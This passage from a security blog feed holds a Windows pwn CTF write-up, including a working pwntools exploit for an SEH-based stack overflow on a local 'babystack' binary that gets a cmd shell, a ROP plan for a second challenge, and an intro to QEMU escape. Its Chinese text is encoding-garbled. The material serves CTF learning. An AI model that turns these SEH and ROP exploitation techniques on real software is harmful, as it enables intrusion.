class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27; , arch=&#x27;amd64&#x27; , log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./babystack.exe&#x27;</span></span><br><span class="line"><span class="comment"># elf=ELF(path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># amd64shell=b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"><span class="comment"># ae64 = AE64()</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line">r64 =<span class="keyword">lambda</span>                         :u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#fmt(&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;)</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p = run()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;stack address = 0x&#x27;</span>)</span><br><span class="line">stack_address = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;stack_address&quot;</span>,stack_address)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;main_address&quot;</span>,main_addr)</span><br><span class="line"></span><br><span class="line">___security_cookie_addr=main_addr+<span class="number">0x2F54</span></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="built_in">str</span>(___security_cookie_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">___security_cookie_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;__security_cookie_value&quot;</span>,___security_cookie_value)</span><br><span class="line"></span><br><span class="line">ebp_addr=stack_address+<span class="number">0x9C</span></span><br><span class="line">gs_addr=ebp_addr-<span class="number">0x1C</span></span><br><span class="line">next_addr=ebp_addr-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="built_in">str</span>(gs_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">gs_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;gs_value&quot;</span>,gs_value)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="built_in">str</span>(next_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">next_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;next_value&quot;</span>,next_value)</span><br><span class="line"></span><br><span class="line">shell_addr=main_addr+<span class="number">0x2DD</span></span><br><span class="line"></span><br><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=SEH_scope_table.ljust(0x80,b&#x27;a&#x27;)+p32(ebp_addr^___security_cookie_value)+b&#x27;b&#x27;*8+p32(next_value)+p32(main_addr + 944)</span></span><br><span class="line"><span class="comment"># payload+=p32(stack_address^___security_cookie_value)+p32(0)</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">4</span>+SEH_scope_table.ljust(<span class="number">0x80</span>-<span class="number">4</span>,<span class="string">b&quot;\x22&quot;</span>)+p32(ebp_addr^___security_cookie_value)+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p32(next_value)</span><br><span class="line">payload+= p32(main_addr + <span class="number">944</span>)+p32((stack_address+<span class="number">4</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [ï¿½æ±¾ 10.0.22631.5189]</span><br><span class="line">(c) Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">D:\win_pwn\babystack&gt;</span><br></pre></td></tr></table></figure><blockquote><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>å¦‚æœåœ¨32ä½çš„windowsä¸‹ï¼Œè¦æ‰“SEHéœ€è¦ä»¥ä¸‹çš„æ¡ä»¶ï¼š</p><ol><li>æ³„éœ²<code>__security_cookie</code>ï¼ˆcodebase+offsetï¼‰</li><li>å¯ä»¥æ³„éœ²æ ˆä¸Šçš„æ•°æ®ï¼ˆ<code>GSã€next_value</code>ï¼‰</li></ol></blockquote><h3 id="2020qwb-stackoverflow"><a href="#2020qwb-stackoverflow" class="headerlink" title="2020qwb_stackoverflow"></a>2020qwb_stackoverflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  FILE *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setbuf(v3, <span class="number">0LL</span>);</span><br><span class="line">  v4 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setbuf(v4, <span class="number">0LL</span>);</span><br><span class="line">  v5 = _acrt_iob_func(<span class="number">2u</span>);</span><br><span class="line">  setbuf(v5, <span class="number">0LL</span>);</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v6;</span><br><span class="line">    <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, DstBuf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;buffer:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(DstBuf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ˜¾ç„¶çœ‹åˆ°æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºå’Œæ•°æ®çš„æ³„éœ²</p><p>åŸºæœ¬ä¸Šä¿æŠ¤éƒ½å¼€å¯äº†</p><p>æ€è·¯ï¼š</p><ol><li>é¦–å…ˆæ³„éœ²codebaseçš„åœ°å€ï¼Œä¸ºä¹‹åå¤šæ¬¡æ³„éœ²åœ°å€åšå‡†å¤‡ï¼Œä¹‹åæ³„éœ²ç¬¬ä¸€æ¬¡çš„cookieç„¶åå°±é‡æ–°ä¸€æ¬¡main</li><li>ç„¶åå°è¯•æ³„éœ²ucrtbase.dllçš„åŸºå€</li><li>ROPæ‰“system(â€œcmdâ€)</li></ol><p>ä½†æ˜¯åœ¨æ ˆä¸Šæ²¡å‘ç°ç›´æ¥çš„ucrtbaseçš„åœ°å€ï¼Œåœ¨windowsçš„IATä¸­ï¼Œç±»ä¼¼Linuxä¸­çš„gotè¡¨ï¼Œé€šè¿‡æ³„éœ²è¿™ä¸ªIATçš„æ•°æ®éœ€è¦æ‹¿åˆ°ç¨‹åºçš„åŸºåœ°å€</p><p>å°±ä¸å†å¤šèµ˜è¿°</p><h2 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹"></a>è°ƒè¯•è¿‡ç¨‹</h2><p>é¦–å…ˆé€šè¿‡win_server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win_server ./babyoverflow.exe 1234</span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸ªæœåŠ¡æ˜ å°„åˆ°æœ¬åœ°<code>127.0.0.1</code>çš„<code>1234</code>ç«¯å£ä¸Š</p><p>ç„¶åå°±å¯ä»¥ç”¨pwntoolsæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1234</span>)</span><br></pre></td></tr></table></figure><p>æ¥è®¿é—®è¿™ä¸ªæœåŠ¡</p><p>ç„¶åé€šè¿‡x32dbgæˆ–x64dbgçš„æ–‡ä»¶-&gt;é™„åŠ -&gt;é€‰æ‹©å¯¹åº”çš„è¿›ç¨‹pidï¼Œå°±å¯ä»¥è¿›è¡Œè°ƒè¯•è¾£</p><p>è®°ä½åœ¨pythonè„šæœ¬ä¸­è¦åœ¨å‡†å¤‡è°ƒè¯•çš„åœ°æ–¹å‰ç”¨pause()åœä¸‹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;window-pwn&quot;&gt;&lt;a href=&quot;#window-pwn&quot; class=&quot;headerlink&quot; title=&quot;window_pwn&quot;&gt;&lt;/a&gt;window_pwn&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post</summary>
      
    
    
    
    <category term="windows" scheme="http://s1nec-1o.github.io/categories/windows/"/>
    
    <category term="pwn" scheme="http://s1nec-1o.github.io/categories/windows/pwn/"/>
    
    
    <category term="windows pwn" scheme="http://s1nec-1o.github.io/tags/windows-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Qemué€ƒé€¸åˆè¯†</title>
    <link href="http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/"/>
    <id>http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/</id>
    <published>2025-05-04T06:09:27.000Z</published>
    <updated>2025-05-04T06:43:49.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qemué€ƒé€¸å­¦ä¹ "><a href="#qemué€ƒé€¸å­¦ä¹ " class="headerlink" title="qemué€ƒé€¸å­¦ä¹ "></a>qemué€ƒé€¸å­¦ä¹ </h1><p>CTFä¸­çš„qemué€ƒé€¸ä¾¿æ˜¯é€šè¿‡åœ¨qemuæºç ä¸­æ³¨å†Œä¸€ä¸ªæ–°çš„pciï¼Œæ¥æ¨¡æ‹ŸçœŸå®ç¯å¢ƒä¸‹çš„æŸä¸€ä¸ªpciå¤–è®¾ï¼Œä¾‹å¦‚é”®ç›˜æ§åˆ¶å™¨ä¹‹ç±»ï¼Ÿé€šè¿‡æ„é€ ç‰¹å®šçš„Guestæ“ä½œè§¦å‘æ¼æ´ï¼ˆä¸€èˆ¬æ˜¯è¶Šç•Œè¯»å†™ï¼‰ï¼Œæœ€ç»ˆåœ¨Hostä¸Šè·å¾—shellè¯»å–flagï¼Œä¸»è¦è¿˜æ˜¯ä¾§é‡äºä»£ç çš„é€†å‘å’Œæ¼æ´çš„åˆ©ç”¨æŠ€å·§ã€‚</p><p>å®æˆ˜ä¸­çš„æˆ–è®¸æ˜¯ç±»ä¼¼äºé’ˆå¯¹äº‘æœåŠ¡å•†çš„ï¼Ÿç›®æ ‡æ˜¯çªç ´ç§Ÿæˆ·éš”ç¦»ï¼Œæ¥è·å¾—å®¿ä¸»æœºçš„æ•æ„Ÿä¿¡æ¯å§ï¼Œè¿˜æ˜¯éå¸¸æœ‰æ„æ€æ»´ï¼ï¼ï¼</p><blockquote><p>åŸæ–‡ï¼š<a href="https://xz.aliyun.com/news/6166">https://xz.aliyun.com/news/6166</a></p><p>åªåšå­¦ä¹ è®°å½•å’Œæ‰¹æ³¨</p><p>å¥½æ–‡ï¼š<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/</a></p></blockquote><h2 id="qemuæ¦‚è¿°"><a href="#qemuæ¦‚è¿°" class="headerlink" title="qemuæ¦‚è¿°"></a>qemuæ¦‚è¿°</h2><p>è¿è¡Œçš„æ¯ä¸ª<code>qemu</code>è™šæ‹Ÿæœºéƒ½ç›¸åº”çš„æ˜¯ä¸€ä¸ªqemuè¿›ç¨‹ï¼Œä»æœ¬è´¨ä¸Šçœ‹ï¼Œè™šæ‹Ÿå‡ºçš„æ¯ä¸ªè™šæ‹Ÿæœºå¯¹åº” <code>host</code> ä¸Šçš„ä¸€ä¸ª <code>qemu</code> è¿›ç¨‹ï¼Œè€Œè™šæ‹Ÿæœºçš„æ‰§è¡Œçº¿ç¨‹ï¼ˆå¦‚ <code>CPU</code> çº¿ç¨‹ã€<code>I/O</code> çº¿ç¨‹ç­‰ï¼‰å¯¹åº” <code>qemu</code> è¿›ç¨‹çš„ä¸€ä¸ªçº¿ç¨‹ã€‚</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433067.png" alt="image-20250501211959652" style="zoom: 33%;" /><blockquote><p>å…¶ä¸­**å®¢æˆ·æœºç³»ç»Ÿ (Guest)**ï¼šè¿è¡Œåœ¨ QEMU ä¹‹ä¸Šï¼Œæ˜¯è™šæ‹Ÿæœºä¸­å®‰è£…çš„æ“ä½œç³»ç»Ÿã€‚</p><p>å®¢æˆ·æœºç³»ç»Ÿè®¤ä¸ºè‡ªå·±ç›´æ¥è¿è¡Œåœ¨ç¡¬ä»¶ä¸Šï¼Œä½†å®é™…ä¸Šæ˜¯<strong>é€šè¿‡ QEMU ä¸åº•å±‚ç¡¬ä»¶äº¤äº’</strong>ã€‚</p></blockquote><p>qemuè™šæ‹Ÿæœºå†…å­˜æ‰€å¯¹åº”çš„çœŸå®å†…å­˜ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p><code>qemu</code>ç”¨äºæ¨¡æ‹Ÿè®¾å¤‡è¿è¡Œï¼Œè€Œqemué€ƒé€¸æ¼æ´å¤šå‘äº<strong>æ¨¡æ‹Ÿpciè®¾å¤‡</strong>ä¸­ï¼Œæ¼æ´å½¢æˆä¸€èˆ¬æ˜¯ä¿®æ”¹<code>qemu-system</code>ä»£ç ï¼Œæ‰€ä»¥æ¼æ´å­˜åœ¨äº<code>qemu-system</code>æ–‡ä»¶å†…ã€‚è€Œé€ƒé€¸å°±æ˜¯æŒ‡åˆ©ç”¨æ¼æ´ä»<code>qemu-system</code>æ¨¡æ‹Ÿçš„è¿™ä¸ªå°ç³»ç»Ÿé€ƒåˆ°ä¸»æœºå†…ï¼Œä»è€Œåœ¨<code>linux</code>ä¸»æœºå†…è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚</p><h2 id="qemuä¸­çš„åœ°å€"><a href="#qemuä¸­çš„åœ°å€" class="headerlink" title="qemuä¸­çš„åœ°å€"></a>qemuä¸­çš„åœ°å€</h2><p>ä»ç”¨æˆ·è™šæ‹Ÿåœ°å€åˆ°ç”¨æˆ·ç‰©ç†åœ°å€ï¼Œä»ç”¨æˆ·ç‰©ç†åœ°å€åˆ°qemuè™šæ‹Ÿåœ°å€</p><p>ç”¨æˆ·çš„ç‰©ç†å†…å­˜å®é™…ä¸Šæ˜¯<code>qemu</code>ç¨‹åº<code>mmap</code>å‡ºæ¥çš„</p><p><code>-m 1G</code>ä¹Ÿå°±æ˜¯<code>mmap</code>ä¸€å—<code>1G</code>çš„å†…å­˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">       -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./vmlinuz-5.0.5-generic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -append &quot;priority=low console=ttyS0&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -device pipeline</span><br></pre></td></tr></table></figure><h2 id="pciè®¾å¤‡æ¦‚è¿°"><a href="#pciè®¾å¤‡æ¦‚è¿°" class="headerlink" title="pciè®¾å¤‡æ¦‚è¿°"></a>pciè®¾å¤‡æ¦‚è¿°</h2><p>PCIè®¾å¤‡éƒ½æœ‰ä¸€ä¸ªé…ç½®ç©ºé—´ï¼ˆPCI Configuration Spaceï¼‰ï¼Œå…¶è®°å½•äº†å…³äºæ­¤è®¾å¤‡çš„è¯¦ç»†ä¿¡æ¯ã€‚<strong>å¤§å°ä¸º256å­—èŠ‚</strong>ï¼Œå…¶ä¸­<strong>å¤´éƒ¨64å­—èŠ‚æ˜¯PCIæ ‡å‡†è§„å®š</strong>çš„ï¼Œå½“ç„¶å¹¶éæ‰€æœ‰çš„é¡¹éƒ½å¿…é¡»å¡«å……ï¼Œä½ç½®æ˜¯å›ºå®šäº†ï¼Œæ²¡æœ‰ç”¨åˆ°å¯ä»¥å¡«å……0ã€‚<strong>å‰16ä¸ªå­—èŠ‚çš„æ ¼å¼æ˜¯ä¸€å®šçš„</strong>ï¼ŒåŒ…å«å¤´éƒ¨çš„ç±»å‹ã€è®¾å¤‡çš„æ€»ç±»ã€è®¾å¤‡çš„æ€§è´¨ä»¥åŠåˆ¶é€ å•†ç­‰ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433069.png" alt="image-20250501230817541" style="zoom:33%;" /><p>æ¯”è¾ƒå…³é”®çš„æ˜¯å…¶6ä¸ªBAR(Base Address Registers)ï¼ŒBARè®°å½•äº†è®¾å¤‡æ‰€éœ€è¦çš„åœ°å€ç©ºé—´çš„ç±»å‹ï¼ŒåŸºå€ä»¥åŠå…¶ä»–å±æ€§ã€‚BARçš„æ ¼å¼å¦‚ä¸‹ï¼š</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433070.png" alt="image-20250501230916132" style="zoom: 50%;" /><p>å½“BARæœ€åä¸€ä½<strong>ä¸º0è¡¨ç¤ºè¿™æ˜¯æ˜ å°„çš„I&#x2F;Oå†…å­˜</strong>ï¼Œ<strong>ä¸º1æ˜¯è¡¨ç¤ºè¿™æ˜¯I&#x2F;Oç«¯å£</strong>ï¼Œå½“æ˜¯I&#x2F;Oå†…å­˜çš„æ—¶å€™1-2ä½è¡¨ç¤ºå†…å­˜çš„ç±»å‹ï¼Œ<strong>bit 2ä¸º1è¡¨ç¤ºé‡‡ç”¨64ä½åœ°å€ï¼Œä¸º0è¡¨ç¤ºé‡‡ç”¨32ä½åœ°å€ã€‚bit1ä¸º1è¡¨ç¤ºåŒºé—´å¤§å°è¶…è¿‡1Mï¼Œä¸º0è¡¨ç¤ºä¸è¶…è¿‡1Mã€‚bit3è¡¨ç¤ºæ˜¯å¦æ”¯æŒå¯é¢„å–ã€‚</strong></p><p>å½“æœ€åä¸€ä½ä¸º1æ—¶è¡¨ç¤ºæ˜ å°„çš„I&#x2F;Oç«¯å£ã€‚I&#x2F;Oç«¯å£ä¸€èˆ¬<strong>ä¸æ”¯æŒé¢„å–</strong>ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯29ä½çš„åœ°å€ã€‚</p><p>é€šè¿‡memory spaceè®¿é—®è®¾å¤‡I&#x2F;Oçš„æ–¹å¼ç§°ä¸ºmemory mapped I&#x2F;Oï¼Œå³<strong>MMIO</strong>ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼ŒCPUç›´æ¥ä½¿ç”¨<strong>æ™®é€šè®¿å­˜æŒ‡ä»¤å³å¯è®¿é—®è®¾å¤‡I&#x2F;O</strong>ã€‚</p><p>é€šè¿‡I&#x2F;O spaceè®¿é—®è®¾å¤‡I&#x2F;Oçš„æ–¹å¼ç§°ä¸º<strong>port I&#x2F;O</strong>ï¼Œæˆ–è€…port mapped I&#x2F;Oï¼Œè¿™ç§æƒ…å†µä¸‹CPUéœ€è¦ä½¿ç”¨<strong>ä¸“é—¨çš„I&#x2F;OæŒ‡ä»¤å¦‚<code>IN/OUT</code>è®¿é—®I&#x2F;Oç«¯å£ã€‚</strong></p><p>åœ¨<strong>MMIO</strong>ä¸­ï¼Œ<strong>å†…å­˜å’ŒI&#x2F;Oè®¾å¤‡å…±äº«åŒä¸€ä¸ªåœ°å€ç©ºé—´ã€‚</strong> MMIOæ˜¯åº”ç”¨å¾—æœ€ä¸ºå¹¿æ³›çš„ä¸€ç§I&#x2F;Oæ–¹æ³•ï¼Œå®ƒ<strong>ä½¿ç”¨ç›¸åŒçš„åœ°å€æ€»çº¿</strong>æ¥å¤„ç†å†…å­˜å’ŒI&#x2F;Oè®¾å¤‡ï¼ŒI&#x2F;Oè®¾å¤‡çš„å†…å­˜å’Œå¯„å­˜å™¨è¢«æ˜ 